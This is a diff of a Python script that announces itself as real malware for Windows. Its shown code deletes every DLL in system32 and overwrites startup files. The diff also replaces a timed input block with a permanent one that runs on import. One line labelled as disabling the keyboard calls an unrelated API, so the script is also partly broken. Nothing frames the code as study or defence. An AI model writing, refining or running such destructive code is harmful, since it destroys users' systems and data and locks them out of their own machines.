@@ -1,6 +1,8 @@
 # This is malware no joke real malware
 # https://codepal.ai
 
+# PUT ALL FUNCTIONS IN DIFFRENT FILE
+
 def delete_dll():
     """
     This function deletes all files ending with '.dll' in the 'C:/Windows/system32' directory. 
@@ -49,22 +51,15 @@ def corrupt_startup_files(source_folder):
         with open(path_to_file, "wb") as binary_file:
             binary_file.write(data)
 
-def disable_mouse_and_keyboard():
-    '''
-    This function disables the mouse and keyboard. 
-    It requires GUI to be available for the script to run.
-    '''
+import ctypes
 
-    import uiautomation as auto
-    import time
+def disable_mouse_keyboard_windows():
+    """
+    Disables mouse and keyboard on Windows
+    """
+    # Disable mouse
+    ctypes.windll.user32.BlockInput(True)
+    # Disable keyboard
+    ctypes.windll.user32.DisableProcessWindowsGhosting()
 
-    try:
-        auto.Win32API.BlockInput(True)
-        print("Mouse and keyboard blocked")
-        time.sleep(15)
-        auto.Win32API.BlockInput(False)
-        print("Mouse and keyboard unblocked")
-    except Exception as e:
-        print(f"Failed because of: {e}")
- 
-disable_mouse_and_keyboard()
+disable_mouse_keyboard_windows()
